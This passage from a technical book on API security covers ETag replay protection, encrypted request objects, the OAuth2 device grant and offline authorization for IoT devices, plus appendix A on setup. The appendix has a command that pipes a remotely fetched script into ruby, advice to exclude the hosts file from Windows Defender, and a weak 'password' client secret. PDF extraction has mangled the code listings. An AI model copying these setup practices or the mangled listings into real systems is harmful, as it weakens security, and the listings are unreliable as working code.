succeeded in this case. But in this case the request is really idempotent anyway.   508  CHAPTER 13 Securing IoT APIs  The client sends a request including the expected ETag in the If-Matches header.  Client  GET resource xyz  API  Response, ETag: abc123  PUT resource xyz If-Matches: abc123  Attacker  Captures request object  PUT resource xyz If-Matches: abc123  412 Precondition Failed  When the attacker tries to replay the captured request, it fails because the ETag no longer matches.  Figure 13.6 A client can prevent replay of authenticated request  objects by including an If-Matches header with the expected ETag of  the resource. The update will modify the resource and cause the ETag  to change, so if an attacker tries to replay the request, it will fail with  a 412 Precondition Failed error.  can prevent this by including a counter or timestamp in the ETag calculation so that the ETag is always different even if the content is the same.  Listing  13.13  shows  an  example  of  updating  a  resource  using  a  simple  monotonic counter as the ETag. In this case, you can use an AtomicInteger class to hold the cur- rent ETag value, using the atomic compareAndSet method to increment the value if the If-Matches header in the request matches the current value. Alternatively, you can store the ETag values for resources in the database alongside the data for a resource and  update  them  in  a  transaction.  If  the  If-Matches  header  in  the  request  doesn’t match the current value, then a 412 Precondition Failed header is returned; otherwise, the resource is updated and a new ETag is returned.   End-to-end authentication  509  Listing 13.13 Using ETags to prevent replay  var etag = new AtomicInteger 42 ; put " test",  request, response  -> {     var expectedEtag = parseInt request.headers "If-Matches"  ;     If not, return a 412 Precondition Failed response.      if  !etag.compareAndSet expectedEtag, expectedEtag + 1   {             response.status 412 ;             return null;                  }                                  System.out.println "Updating resource with new content: " +         request.body   ;      response.status 200 ;                                            response.header "ETag", String.valueOf expectedEtag + 1  ;       response.type "text plain" ;     return "OK"; } ;  Check the  current ETag  matches the  one in the  request.  Otherwise,  return the  new ETag after  updating the  resource.  The  ETag  mechanism  can  also  be  used  to  prevent  replay  of  a  PUT  request  that  is intended  to  create  a  resource  that  doesn’t  yet  exist.  Because  the  resource  doesn’t exist, there is no existing ETag or Last-Modified date to include. An attacker could replay this message to overwrite a later version of the resource with the original con- tent.  To  prevent  this,  you  can  include  an  If-None-Match  header  with  the  special value *, which tells the server to reject the request if there is any existing version of this resource at all.  TIP The Constrained Application Protocol  CoAP , often used for implementing REST APIs in constrained environments, doesn’t support the Last-Modified or  If-Unmodified-Since  headers,  but  it  does  support  ETags  along  with  If- Matches and If-None-Match. In CoAP, headers are known as options.  ENCODING HEADERS WITH END-TO-END SECURITY As explained in chapter 12, in an end-to-end IoT application, a device may not be able to directly talk to the API in HTTP  or CoAP  but must instead pass an authenticated message through multiple intermediate proxies. Even if each proxy supports HTTP, the client may not trust those proxies not to interfere with the message if there isn’t an end-to-end TLS connection. The solution is to encode the HTTP headers along with the request data into an encrypted request object, as shown in listing 13.14.   DEFINITION A request object is an API request that is encapsulated as a single data  object  that  can  be  encrypted  and  authenticated  as  one  element.  The request object captures the data in the request as well as headers and other metadata required by the request.  In this example, the headers are encoded as a CBOR map, which is then combined with the request body and an indication of the expected HTTP method to create the overall request object. The entire object is then encrypted and authenticated using   510  CHAPTER 13 Securing IoT APIs  NaCl’s CryptoBox functionality. OSCORE, discussed in section 13.1.4, is an example of an end-to-end protocol using request objects. The request objects in OSCORE are CoAP messages encrypted with COSE.  TIP Full source code for this example is provided in the GitHub repository accompanying the book at http:  mng.bz QxWj.  Listing 13.14 Encoding HTTP headers into a request object  Encode any  required HTTP  headers into CBOR.  var revisionEtag = "42";                     var headers = CBORObject.NewMap                      .Add "If-Matches", revisionEtag ;    var body = CBORObject.NewMap              .Add "foo", "bar"             .Add "data", 12345 ;    var request = CBORObject.NewMap           .Add "method", "PUT"                      .Add "headers", headers                   .Add "body", body ;               var sent = CryptoBox.encrypt clientKeys.getPrivate  ,                  serverKeys.getPublic  , request.EncodeToBytes   ;       Encode the headers  and body, along with  the HTTP method, as  a single object.  Encrypt and  authenticate  the entire  request object.  To validate the request, the API server should decrypt the request object and then ver- ify that the headers and HTTP request method match those specified in the object. If they don’t match, then the request should be rejected as invalid.  CAUTION You should always ensure the actual HTTP request headers match the request object rather than replacing them. Otherwise, an attacker can use the request object to bypass security filtering performed by Web Application Fire- walls and other security controls. You should never let a request object change the HTTP method because many security checks in web browsers rely on it.  Listing  13.15  shows  how  to  validate  a  request  object  in  a  filter  for  the  Spark  HTTP framework you’ve used in earlier chapters. The request object is decrypted using NaCl. Because this is authenticated encryption, the decryption process will fail if the request has been faked or tampered with. You should then verify that the HTTP method of the request matches the method included in the request object, and that any headers listed in the request object are present with the expected values. If any details don’t match, then you should reject the request with an appropriate error code and message. Finally, if all checks pass, then you can store the decrypted request body in an attribute so that it can easily be retrieved without having to decrypt the message again.  Listing 13.15 Validating a request object  before  request, response  -> {     var encryptedRequest = CryptoBox.fromString request.body   ;         var decrypted = encryptedRequest.decrypt                                     serverKeys.getPrivate  , clientKeys.getPublic   ;            var cbor = CBORObject.DecodeFromBytes decrypted ;                 Decrypt the  request object  and decode it.

Check that any headers in the request object have their expected values.      var expectedHeaders = cbor.get "headers" ;                           for  var headerName : expectedHeaders.getKeys    {                       if  !expectedHeaders.get headerName .AsString                                .equals request.headers headerName.AsString      {               halt 403 ;                                                       }                                                                }                                                                     request.attribute "decryptedRequest", cbor.get "body"  ;    } ;  If all checks  pass, then store  the decrypted  request body.

What started as a way to do delegated authorization  in  traditional  web  applications  has  expanded  to  encompass  mobile   512  CHAPTER 13 Securing IoT APIs  apps, service-to-service APIs, and microservices. It should therefore come as little sur- prise that it is also being applied to securing APIs in the IoT. It’s especially suited to consumer IoT applications in the home. For example, a smart TV may allow users to log in  to  streaming  services  to  watch  films  or  listen  to  music,  or  to  view  updates  from social media streams. These are well-suited to OAuth2, because they involve a human delegating part of their authority to a device for a well-defined purpose.   DEFINITION A  smart  TV   or  connected  TV   is  a  television  that  is  capable  of accessing services over the internet, such as music or video streaming or social media APIs. Many other home entertainment devices are also now capable of accessing the internet and APIs are powering this transformation.  But the traditional approaches to obtain authorization can be difficult to use in an IoT environment for several reasons:   The device may lack a screen, keyboard, or other capabilities needed to let a user interact with the authorization server to approve consent. Even on a more capable device such as a smart TV, typing in long usernames or passwords on a small remote control can be time-consuming and annoying for users. Section 13.2.1 discusses the device authorization grant that aims to solve this problem.   Token formats and security mechanisms used by authorization servers are often heavily focused on web browser clients or mobile apps and are not suitable for more  constrained  devices.  The  ACE-OAuth  framework  discussed  in  section 13.2.2 is an attempt to adapt OAuth2 for such constrained environments.  DEFINITION ACE-OAuth  Authorization for Constrained Environments using OAuth2   is  a  framework  specification  that  adapts  OAuth2  for  constrained devices.  The OAuth2 device authorization grant  RFC 8628, https:  tools.ietf.org html rfc8628  allows devices that lack normal input and output capabilities to obtain access tokens from  users.  In  the  normal  OAuth2  flows  discussed  in  chapter  7,  the  OAuth2  client would redirect the user to a web page on the authorization server  AS , where they can log in and approve access. This is not possible on many IoT devices because they have no display to show a web browser, and no keyboard, mouse, or touchscreen to let the user enter their details. The device authorization grant, or device flow as it is often called, solves this problem by letting the user complete the authorization on a second device, such as a laptop or mobile phone. Figure 13.7 shows the overall flow, which is described in more detail in the rest of this section.   To initiate the flow, the device first makes a POST request to a new device authoriza- tion endpoint at the AS, indicating the scope of the access token it requires and authen- ticating using its client credentials. The AS returns three details in the response:  13.3.1 The device authorization grant   OAuth2 for constrained environments  513   A device code, which is a bit like an authorization code from chapter 7 and will eventually  be  exchanged  for  an  access  token  after  the  user  authorizes  the request. This is typically an unguessable random string.   A user code, which is a shorter code designed to be manually entered by the user  when they approve the authorization request.   A verification URI where the user should go to type in the user code to approve the request. This will typically be a short URI if the user will have to manually type it in on another device.  Listing 13.16 shows how to begin a device grant authorization request from Java. In this example, the device is a public client and so you only need to supply the client_id and  Device  Authorization  server  User  Smartphone  Starts device grant  Device code, user code, veriﬁcation  URI  The client starts the device grant, including its client ID and requested scope.  Asks user to visit veriﬁcation URI  and type in user code  Loop  Visits veriﬁcation URI  The user visits the veriﬁcation URI on another device and types in the user code to approve the authorization grant.  Checks status  Keeps trying  Checks status  Accesses token  The client uses the device code to poll the token endpoint until the ﬂow completes.  Fetches veriﬁcation URI  Authenticates user  Types in user code  Figure 13.7 In the OAuth2 device authorization grant, the device first calls an endpoint on  the AS to start the flow and receives a device code and short user code. The device asks  the user to navigate to the AS on a separate device, such as a smartphone. After the user  authenticates, they type in the user code and approve the request. The device polls the AS  in the background using the device code until the flow completes. If the user approved the  request, then the device receives an access token the next time it polls the AS.   514  CHAPTER 13 Securing IoT APIs  scope  parameters  on  the  request.  If  your  device  is  a  confidential  client,  then  you would  also  need  to  supply  client  credentials  using  HTTP  Basic  authentication  or another  client  authentication  method  supported  by  your  AS.  The  parameters  are URL-encoded  as  they  are  for  other  OAuth2  requests.  The  AS  returns  a  200  OK response if the request is successful, with the device code, user code, and verification URI in JSON format. Navigate to src main java com manning apisecurityinaction and create a new file named DeviceGrantClient.java. Create a new public class in the file with the same name and add the method from listing 13.16 to the file. You’ll need the following imports at the top of the file:  import org.json.JSONObject; import java.net.*; import java.net.http.*; import java.net.http.HttpRequest.BodyPublishers; import java.net.http.HttpResponse.BodyHandlers; import java.util.concurrent.TimeUnit; import static java.nio.charset.StandardCharsets.UTF_8;  Listing 13.16 Starting a device authorization grant flow  private static final HttpClient httpClient = HttpClient.newHttpClient  ;  private static JSONObject beginDeviceAuthorization          String clientId, String scope  throws Exception {     var form = "client_id=" + URLEncoder.encode clientId, UTF_8  +                  "&scope=" + URLEncoder.encode scope, UTF_8 ;                    var request = HttpRequest.newBuilder                                            .header "Content-Type",                                                     "application x-www-form-urlencoded"                                 .uri URI.create                                                             "https:  as.example.com device_authorization"                       .POST BodyPublishers.ofString form                                      .build  ;                                                       var response = httpClient.send request, BodyHandlers.ofString   ;    Encode the client ID and scope as form parameters and POST them to the device endpoint.      if  response.statusCode   != 200  {                                  throw new RuntimeException "Bad response from AS: " +                response.body   ;                                        }                                                                return new JSONObject response.body   ;    }  If the response  is not 200 OK,  then an error  occurred.  Otherwise, parse the  response as JSON.  The device that initiated the flow communicates the verification URI and user code to the user but keeps the device code secret. For example, the device might be able to dis- play a QR code  figure 13.8  that the user can scan on their phone to open the verifi- cation URI, or the device might communicate directly with the user’s phone over a local Bluetooth connection. To approve the authorization, the user opens the verifica- tion URI on their other device and logs in. They then type in the user code and can either approve or deny the request after seeing details of the scopes requested.   OAuth2 for constrained environments  515  Figure 13.8 A QR code is a way to encode a URI  that can be easily scanned by a mobile phone with a  camera. This can be used to display the verification  URI used in the OAuth2 device authorization grant. If  you scan this QR code on your phone, it will take you  to the home page for this book.  TIP The AS may also return a verification_uri_complete field that com- bines the verification URI with the user code. This allows the user to just fol- low the link without needing to manually type in the code.  The original device that requested authorization is not notified that the flow has com- pleted. Instead, it must periodically poll the access token endpoint at the AS, passing in the device code it received in the initial request as shown in listing 13.17. This is the same access token endpoint used in the other OAuth2 grant types discussed in chap- ter 7, but you set the grant_type parameter to  urn:ietf:params:oauth:grant-type:device_code  to indicate that the device authorization grant is being used. The client also includes its client ID and the device code itself. If the client is confidential, it must also authen- ticate using its client credentials, but this example is using a public client. Open the DeviceGrantClient.java file again and add the method from the following listing.  Listing 13.17 Checking status of the authorization request  private static JSONObject pollAccessTokenEndpoint          String clientId, String deviceCode  throws Exception {     var form = "client_id=" + URLEncoder.encode clientId, UTF_8  +              "&grant_type=urn:ietf:params:oauth:grant-type:device_code" +            "&device_code=" + URLEncoder.encode deviceCode, UTF_8 ;              var request = HttpRequest.newBuilder                                           .header "Content-Type",                                                        "application x-www-form-urlencoded"                            .uri URI.create "https:  as.example.com access_token"                  .POST BodyPublishers.ofString form                                     .build  ;                                                      var response = httpClient.send request, BodyHandlers.ofString   ;      return new JSONObject response.body   ;      }  Parse the response  as JSON.  Post the  parameters  to the  access token  endpoint at  the AS.  Encode the client ID and device code along with the device_code grant type URI.   516  CHAPTER 13 Securing IoT APIs  If the user has already approved the request, then the AS will return an access token, optional refresh token, and other details as it does for other access token requests you learned about in chapter 7. Otherwise, the AS returns one of the following status codes:  authorization_pending indicates that the user hasn’t yet approved or denied  the request and the device should try again later.   slow_down indicates that the device is polling the authorization endpoint too frequently and should increase the interval between requests by 5 seconds. An AS may revoke authorization if the device ignores this code and continues to poll too frequently.   access_denied indicates that the user refused the request.  expired_token indicates that the device code has expired without the request being approved or denied. The device will have to initiate a new flow to obtain a new device code and user code.  Listing 13.18 shows how to handle the full authorization flow in the client building on the previous methods. Open the DeviceGrantClient.java file again and add the main method from the listing.  TIP If you want to test the client, the ForgeRock Access Management  AM  product  supports  the  device  authorization  grant.  Follow  the  instructions  in appendix A to set up the server and then the instructions in http:  mng.bz  X0W6 to configure the device authorization grant. AM implements an older draft  version  of  the  standard  and  requires  an  extra  response_type=device _code parameter on the initial request to begin the flow.  Listing 13.18 The full device authorization grant flow  public static void main String... args  throws Exception {     var clientId = "deviceGrantTest";     var scope = "a b c";      var json = beginDeviceAuthorization clientId, scope ;        var deviceCode = json.getString "device_code" ;              var interval = json.optInt "interval", 5 ;                   System.out.println "Please open " +                    json.getString "verification_uri"  ;           System.out.println "And enter code:\n\t" +             json.getString "user_code"  ;               Display the  verification URI and  user code to the user.  Start the  authorization  process and store  the device code  and poll interval.      while  true  {                                                     Thread.sleep TimeUnit.SECONDS.toMillis interval  ;             json = pollAccessTokenEndpoint clientId, deviceCode ;          var error = json.optString "error", null ;         if  error != null  {             switch  error  {                 case "slow_down":                                              System.out.println "Slowing down" ;                        interval += 5;                                             break;  If the AS tells you  to slow down,  then increase the  poll interval by  5 seconds.  Poll the access token endpoint with the device code according to the poll interval.

The main output of this group is the definition of the ACE-OAuth framework  http:  mng.bz yr4q , which describes how to  perform  OAuth2  authorization  requests  over  CoAP  instead  of  HTTP  and  using CBOR instead of JSON for requests and responses. COSE is used as a standard format for access tokens and can also be used as a proof of possession  PoP  scheme to secure tokens against theft  see section 11.4.6 for a discussion of PoP tokens . COSE can also be used to protect API requests and responses themselves, using the OSCORE frame- work you saw in section 13.1.4.   At the time of writing, the ACE-OAuth specifications are still under development but are approaching publication as standards. The main framework describes how to adapt OAuth2 requests and responses to use CBOR, including support for the autho- rization code, client credentials, and refresh token grants.3 The token introspection endpoint  is  also  supported,  using  CBOR  over  CoAP,  providing  a  standard  way  for resource servers to check the status of an access token.    Unlike  the  original  OAuth2,  which  used  bearer  tokens  exclusively  and  has  only recently  started  supporting  proof-of-possession   PoP   tokens,  ACE-OAuth  has  been designed around PoP from the start. Issued access tokens are bound to a cryptographic key and can only be used by a client that can prove possession of this key. This can be accomplished with either symmetric or public key cryptography, providing support for a wide range of device capabilities. APIs can discover the key associated with a device either through token introspection or by examining the access token itself, which is typically in CWT format. When public key cryptography is used, the token will contain the public key of the client, while for symmetric key cryptography, the secret key will be present in COSE-encrypted form, as described in RFC 8747  https:  datatracker .ietf.org doc html rfc8747 .  3 Strangely, the device authorization grant is not yet supported.   518  CHAPTER 13 Securing IoT APIs  13.4 Offline access control  Many IoT applications involve devices operating in environments where they may not have a permanent or reliable connection to central authorization services. For exam- ple, a connected car may be driven through long tunnels or to remote locations where there is no signal. Other devices may have limited battery power and so want to avoid making  frequent  network  requests.  It’s  usually  not  acceptable  for  a  device  to  com- pletely  stop  functioning  in  this  case,  so  you  need  a  way  to  perform  security  checks while the device is disconnected. This is known as offline authorization. Offline authori- zation allows devices to continue accepting and producing API requests to other local devices and users until the connection is restored.  DEFINITION Offline  authorization  allows  a  device  to  make  local  security  deci- sions when it is disconnected from a central authorization server.  Allowing  offline  authorization  often  comes  with  increased  risks.  For  example,  if  a device  can’t check  with  an  OAuth2 authorization server  whether an  access  token is valid, then it may accept a token that has been revoked. This risk must be balanced against the costs of downtime if devices are offline and the appropriate level of risk determined for your application. You may want to apply limits to what operations can be performed in offline mode or enforce a time limit for how long devices will oper- ate in a disconnected state.  Some devices may never need to interact with a user at all, but for some IoT applica- tions  this  is  a  primary  concern.  For  example,  many  companies  now  operate  smart lockers  where  goods  ordered  online can  be  delivered  for  later  collection.  The  user arrives at a later time and uses an app on their smartphone to send a request to open the locker. Devices used in industrial IoT deployments may work autonomously most of the time, but occasionally need servicing by a human technician. It would be frus- trating for the user if they couldn’t get their latest purchase because the locker can’t connect  to  a  cloud  service  to  authenticate  them,  and  a  technician  is  often  only involved when something has gone wrong, so you shouldn’t assume that network ser- vices will be available in this situation.   The solution is to make user credentials available to the device so that it can locally authenticate  the  user.  This  doesn’t  mean  that  the  user’s  password  hash  should  be transmitted  to  the  device,  because  this  would  be  very  dangerous:  an  attacker  that intercepted the hash could perform an offline dictionary attack to try to recover the password. Even worse, if the attacker compromised the device, then they could just intercept the password directly as the user types it. Instead, the credential should be short-lived and limited to just the operations needed to access that device. For exam- ple, a user can be sent a one-time code that they can display on their smartphone as a QR  code  that  the  smart  locker  can  scan.  The  same  code  is  hashed  and  sent  to  the  13.4.1 Offline user authentication   Offline access control  519  device, which can then compare the hash to the QR code and if they match, it opens the locker, as shown in figure 13.9.  Cloud retailer  One-time code  When the user orders goods for collection, they are given a one-time code.  A secure hash of the code and details of the delivery are transmitted to the locker.  SHA-256 one-time code   Locker 1  Secure locker  QR code scanner  Locker 1  Locker 2  The user’s phone displays the code as a QR code that is scanned by the locker.  If the code matches the hash, then the locker is unlocked and the code deleted.  Figure 13.9 One-time codes can be periodically sent to an IoT device such as a  secure locker. A secure hash of the code is stored locally, allowing the locker to  authenticate users even if it cannot contact the cloud service at that time.  For this approach to work, the device must be online periodically to download new credentials. A signed, self-contained token format can overcome this problem. Before leaving to service a device in  the field, the technician can  authenticate to  a central authorization  server  and  receive  an  OAuth2  access  token  or  OpenID  Connect  ID token. This token can include a public key or a temporary credential that can be used to locally authenticate the user. For example, the token can be bound to a TLS client certificate as described in chapter 11, or to a key using CWT PoP tokens mentioned in section 13.3.2. When the technician arrives to service the device, they can present the  access  token  to  access  device  APIs  over  a  local  connection,  such  as  Bluetooth   520  CHAPTER 13 Securing IoT APIs  Low-Energy  BLE . The device API can verify the signature on the access token and check the scope, issuer, audience, expiry time, and other details. If the token is valid, then the embedded credentials can be used to authenticate the user locally to allow access according to the conditions attached to the token.  13.4.2 Offline authorization  Offline authentication solves  the  problem of identifying users without a  direct con- nection  to  a  central  authentication  service.  In  many  cases,  device  access  control decisions  are  simple  enough  to  be  hard-coded  based  on  pre-existing  trust  relation- ships. For example, a device may allow full access to any user that has a credential issued by a trusted source and deny access to everybody else. But not all access con- trol policies are so simple, and access may depend on a range of dynamic factors and changing conditions. Updating complex policies for individual devices becomes diffi- cult as the number of devices grows. As you learned in chapter 8, access control poli- cies  can  be  centralized  using  a  policy  engine  that  is  accessed  via  its  own  API.  This simplifies management of device policies, but again can lead to problems if the device is offline.   The solutions are similar to the solutions to offline authentication described in the last section. The most basic solution is for the device to periodically download the lat- est policies in a standard format such as XACML, discussed in chapter 8. The device can then make local access control decisions according to the policies. XACML is a complex XML-based format, so you may want to consider a more lightweight policy language encoded in CBOR or another compact format, but I am not aware of any standards for such a language.   Self-contained access token formats can also be used to permit offline authoriza- tion.  A  simple  example  is  the  scope  included  in  an  access  token,  which  allows  an offline device to determine which API operations a client should be allowed to call. More complex conditions can be encoded as caveats using a macaroon token format, discussed in chapter 9. Suppose that you used your smartphone to book a rental car. An access token in macaroon format is sent to your phone, allowing you to unlock the car by transmitting the token to the car over BLE just like in the example at the end of section  13.4.1.  You  later  drive  the  car  to  an  evening  event  at  a  luxury  hotel  in  a secluded location with no cellular network coverage. The hotel offers valet parking, but you don’t  trust  the attendant,  so you only want to allow them limited ability to drive the expensive car you hired. Because your access token is a macaroon, you can simply  append  caveats  to  it  restricting  the  token  to  expire  in  10  minutes  and  only allow the car to be driven in a quarter-mile radius of the hotel.     Macaroons  are  a  great  solution  for  offline  authorization  because  caveats  can  be added by devices at any time without any coordination and can then be locally verified by devices without needing to contact a central service. Third-party caveats can also work well in an IoT application, because they require the client to obtain proof of authorization from the third-party API. This authorization can be obtained ahead   Summary  521  of time by the client and then verified by the device by checking the discharge maca- roon, without needing to directly contact the third party.

Summary   Devices  can  be  identified  using  credentials  associated  with  a  device  profile. These credentials could be an encrypted pre-shared key or a certificate contain- ing a public key for the device.   Device authentication can be done at the transport layer, using facilities in TLS, DTLS, or other secure protocols. If there is no end-to-end secure connection, then you’ll need to implement your own authentication protocol.   End-to-end device authentication must ensure freshness to prevent replay attacks. Freshness can be achieved with timestamps, nonces, or challenge-response pro- tocols. Preventing replay requires storing per-device state, such as a monotoni- cally increasing counter or recently used nonces.   REST APIs can prevent replay by making use of authenticated request objects that  contain  an  ETag  that  identifies  a  specific  version  of  the  resource  being acted on. The ETag should change whenever the resource changes to prevent replay of previous requests.   The  OAuth2  device  grant  can  be  used  by  devices  with  no  input  capability  to obtain access tokens authorized by a user. The ACE-OAuth working group at   522  CHAPTER 13 Securing IoT APIs  the IETF is developing specifications that adapt OAuth2 for use in constrained environments.   Devices  may  not  always  be  able  to  connect  to  central  cloud  services.  Offline authentication and access control allow devices to continue to operate securely when disconnected. Self-contained token formats can include credentials and policies to ensure authority isn’t exceeded, and proof-of-possession  PoP  con- straints can be used to provide stronger security guarantees.   appendix A Setting up Java and Maven  The source code examples in this book require several prerequisites to be installed and configured before they can be run. This appendix describes how to install and configure those prerequisites. The following software is required:     Java 11    Maven 3  A.1  Java and Maven  A.1.1 macOS  On macOS, the simplest way to install the pre-requisites is using Homebrew  https:   brew.sh . Homebrew is a package manager that simplifies installing other software on macOS. To install Homebrew, open a Terminal window  Finder > Applications > Utilities > Terminal  and type the following command:   usr bin ruby -e "$ curl -fsSL  ➥ https:  raw.githubusercontent.com Homebrew install master install "  This  script  will  guide  you  through  the  remaining  steps  to  install  Homebrew.  If you don’t want to use Homebrew, all the prerequisites can be manually installed instead. INSTALLING JAVA 11 If you have installed Homebrew, then the latest Java can be installed with the fol- lowing simple command:  brew cask install adoptopenjdk  523   524  APPENDIX A Setting up Java and Maven  TIP Some Homebrew packages are marked as casks, which means that they are binary-only native applications rather than installed from source code. In most cases, this just means that you use brew cask install rather than brew install.  The latest version of Java should work with the examples in this book, but you can tell Homebrew to install version 11 by running the following commands:  brew tap adoptopenjdk openjdk brew cask install adoptopenjdk11  This will install the free AdoptOpenJDK distribution of Java into  Library Java Java- VirtualMachines adoptopenjdk-11.0.6.jdk.  If  you  did  not  install  Homebrew,  then binary installers can be downloaded from https:  adoptopenjdk.net.    Once Java 11 is installed, you can ensure that it is used by running the following  command in your Terminal window:  export JAVA_HOME=$  usr libexec java_home -v11   This instructs Java to use the OpenJDK commands and libraries that you just installed. To check that Java is installed correctly, run the following command:  java -version  You should see output similar to the following:  openjdk version "11.0.6" 2018-10-16 OpenJDK Runtime Environment AdoptOpenJDK  build 11.0.1+13  OpenJDK 64-Bit Server VM AdoptOpenJDK  build 11.0.1+13, mixed mode   INSTALLING MAVEN Maven can be installed from Homebrew using the following command:  brew install maven  Alternatively,  Maven  can  be  manually  installed  from  https:  maven.apache.org.  To check that you have Maven installed correctly, type the following at a Terminal window:  mvn -version  The output should look like the following:  Apache Maven 3.5.4  1edded0938998edf8bf061f1ceb3cfdeccf443fe; 2018-06-  17T19:33:14+01:00   Maven home:  usr local Cellar maven 3.5.4 libexec Java version: 11.0.1, vendor: AdoptOpenJDK, runtime:  Library Java   JavaVirtualMachines adoptopenjdk-11.0.1.jdk Contents Home  Default locale: en_GB, platform encoding: UTF-8 OS name: "mac os x", version: "10.14.2", arch: "x86_64", family: "mac"   Installing an Authorization Server  525  A.1.2 Windows  A.1.3  A.2  A.3  On Windows 10, you can install the dependencies using Homebrew using the Win- dows Subsystem for Linux  WSL . To install WSL, go to https:  docs.microsoft.com  en-us windows wsl about  and  follow  the  instructions.  You  can  then  follow  the instructions for installing Homebrew for Linux in section A.1.3.  Linux On a Linux system, you can either install the dependencies using your distribution’s package manager, or you can install Homebrew and follow the same instructions for macOS to install Java and Maven. To install Homebrew on Linux, follow the instruc- tions at https:  docs.brew.sh Homebrew-on-Linux.  Installing Docker Docker  https:  www.docker.com  is a platform for building and running Linux con- tainers. Some of the software used in the examples is packaged using Docker, and the Kubernetes examples in chapters 10 and 11 require a Docker installation.   Although Docker can be installed through Homebrew and other package managers, the Docker Desktop installation tends to work better and is easier to use. You can down- load the installer for each platform from the Docker website or using the following links:    Windows: http:  mng.bz qNYA   MacOS: https:  download.docker.com mac stable Docker.dmg   Linux  installers  can  be  found  under  https:  download.docker.com linux   static stable   After downloading the installer for your platform, run the file and follow the instruc- tions to install Docker Desktop.  Installing an Authorization Server For  the  examples  in  chapter  7  and  later  chapters,  you’ll  need  a  working  OAuth2 Authorization Server  AS . There are many commercial and open source AS imple- mentations to choose from. Some of the later chapters use cutting-edge features that are  currently  only  implemented  in  commercial  AS  implementations.  I’ve  therefore provided instructions for installing an evaluation copy of a commercial AS, but you could also use an open source alternative for many of the examples, such as MITREid Connect  http:  mng.bz 7Gym .   A.3.1  Installing ForgeRock Access Management ForgeRock  Access  Management   https:  www.forgerock.com   is  a  commercial  AS  and a lot more besides  that implements a wide variety of OAuth2 features.  NOTE The  ForgeRock  software  is  provided  for  evaluation  purposes  only. You’ll need a commercial license to use it in production. See the ForgeRock website for details.   526  APPENDIX A Setting up Java and Maven  SETTING UP A HOST ALIAS Before  running  AM, you  should  add an  entry  into  your  hosts  file to  create an  alias hostname for it to run under. On MacOS and Linux you can do this by editing the  etc hosts file, for example, by running:  sudo vi  etc hosts  TIP If you’re not familiar with vi use your editor of choice. Hit the Escape key and then type :q! and hit Return to exit vi if you get stuck.  Add the following line to the  etc hosts file and save the changes:  127.0.0.1  as.example.com  There must be at least two spaces between the IP address and the hostname.   On Windows, the file is in C:\Windows\System32\Drivers\etc\hosts. You can create the file if it doesn’t already exist. Use Notepad or another plain text editor to edit the hosts file.  WARNING Windows 8 and later versions may revert any changes you make to the hosts file to protect against malware. Follow the instructions on this site to exclude the hosts file from Windows Defender: http:  mng.bz mNOP.  RUNNING THE EVALUATION VERSION Once the host alias is set up, you can run the evaluation version of ForgeRock Access Management  AM  by running the following Docker command:  docker run -i -p 8080:8080 -p 50389:50389 \   -t gcr.io forgerock-io openam:6.5.2  This will download and run a copy of AM 6.5.2 in a Tomcat servlet environment inside a Docker container and make it available to access over HTTP on the local port 8080.   TIP The  storage  for  this  image  is  non-persistent  and  will  be  deleted  when you shut it down. Any configuration changes you make will not be saved.  Once the download and startup are complete, it will display a lot of console output finishing with a line like the following:  10-Feb-2020 21:40:37.320 INFO [main]  ➥ org.apache.catalina.startup.Catalina.start Server startup in  ➥ 30029 ms  You can now continue the installation by navigating to http:   as.example.com:8080  in a web browser. You will see an installation screen as in figure A.1. Click on the link to Create Default Configuration to begin the install.   You’ll then be asked to accept the license agreement, so scroll down and tick the box to accept and click continue. The final step in the installation is to pick an admin- istrator  password.  Because  this  is  just  a  demo  environment  on  your  local  machine,   Installing an Authorization Server  527  Figure A.1 The ForgeRock AM installation screen. Click on the link to Create Default Configuration.  choose any value you like that is at least eight characters long. Make a note of the pass- word you’ve chosen. Type the password into both boxes and then click Create Config- uration  to  finalize  the  installation.  This  may  take  a  few  minutes  as  it  installs  the components of the server into the Docker image.    After  the  installation  has  completed,  click  on  the  link  to  Proceed  to  Login  and then enter the password you chose during the installer with the username amadmin. You’ll end up in the AM admin console, shown in figure A.2. Click on the Top Level Realms box to get to the main dashboard page, shown in figure A.3.    On  the  main  dashboard,  you  can  configure  OAuth2  support  by  clicking  on  the Configure OAuth Provider button, as shown in figure A.3. This will then give you the option to configure OAuth2 for various use cases. Click Configure OpenID Connect and then click the Create button in the top right-hand side of the screen.   After you’ve configured OAuth2 support, you can use curl to query the OAuth2  configuration document by opening a new terminal window and running:  curl http:  as.example.com:8080 oauth2 .well-known  ➥ openid-configuration  jq  TIP If you don’t have curl or jq installed already, you can install them by run- ning brew install curl jq on Mac or apt-get install curl jq on Linux. On Windows,  they  can  be  downloaded  from  https:  curl.haxx.se  and  https:   stedolan.github.io jq .   528  APPENDIX A Setting up Java and Maven  Figure A.2 The AM admin console home screen. Click the Top Level Realms box.  Click Conﬁgure OAuth Provider to set up OAuth2 support.  OAuth2 clients are conﬁgured under Applications.  Figure A.3 In the main AM dashboard page, click Configure OAuth Provider to set up OAuth2 support.  Later, you will configure an OAuth2 client under the Applications page in the sidebar.   Installing an Authorization Server  529  The JSON output includes several useful endpoints that you’ll need for the examples in chapter 7 and later. Table A.1 summarizes the relevant values from the configura- tion. See chapter 7 for a description of these endpoints.  Table A.1 ForgeRock AM OAuth2 endpoints  Endpoint name  URI  Token endpoint  Introspection endpoint  Authorization endpoint  UserInfo endpoint  JWK Set URI  http:   as.example.com:8080 oauth2 access_token  http:   as.example.com:8080 oauth2 introspect  http:   as.example.com:8080 oauth2 authorize  http:   as.example.com:8080 oauth2 userinfo  http:   as.example.com:8080 oauth2 connect jwk_uri  Dynamic client registration endpoint  http:   as.example.com:8080 oauth2 register  Revocation endpoint  http:   as.example.com:8080 oauth2 token revoke  To  register  an  OAuth2  client,  click  on  Applications  in  the  left-hand  sidebar,  then OAuth2, and then Clients. Click the New Client button and you’ll see the form for basic client details shown in figure A.4. Give the client the ID “test” and a client secret. You  can  choose  a  weak  client  secret  for  development  purposes;  I  use  “password.” Finally, you can configure some scopes that the client is permitted to ask for.  TIP By default, AM only supports the basic OpenID Connect scopes: openid, profile,  email,  address,  and  phone.  You  can  add  new  scopes  by  clicking  on  Figure A.4 Adding a new client. Give the client a name and a client secret. Add some permitted scopes. Finally,  click the Create button to create the client.   530  APPENDIX A Setting up Java and Maven  Services in the left-hand sidebar, then OAuth2 Provider. Then click on the Advanced  tab  and  add  the  scopes  to  the  Supported  Scopes  field  and  click Save  Changes.  The  scopes  that  are  used  in  the  examples  in  this  book  are create_space, post_message, read_message, list_messages, delete_message, and add_member.  After you’ve created the client, you’ll be taken to the advanced client properties page. There are a lot of properties! You don’t need to worry about most of 